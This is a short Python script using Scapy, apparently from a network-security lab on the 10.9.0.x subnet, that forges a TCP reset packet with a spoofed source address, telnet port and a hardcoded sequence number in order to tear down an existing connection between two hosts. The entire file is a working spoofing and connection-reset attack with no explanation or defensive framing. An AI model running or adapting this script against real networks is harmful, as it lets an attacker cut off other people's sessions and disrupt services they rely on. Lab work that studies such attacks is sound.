#!/usr/bin/python3
import sys
from scapy.all import *

print("Sending TCP RST packet .....")

IP_src = "10.9.0.6"
IP_dst = "10.9.0.5"
src_p = 23
dst_p = 44788
seq_num = 2652191602

IP_layer = IP( src=IP_src, dst=IP_dst )
TCP_layer = TCP( sport=src_p, dport=dst_p, flags="R", seq=seq_num )

rst_pkt = IP_layer/TCP_layer
ls(rst_pkt)

send( rst_pkt, verbose=0 )
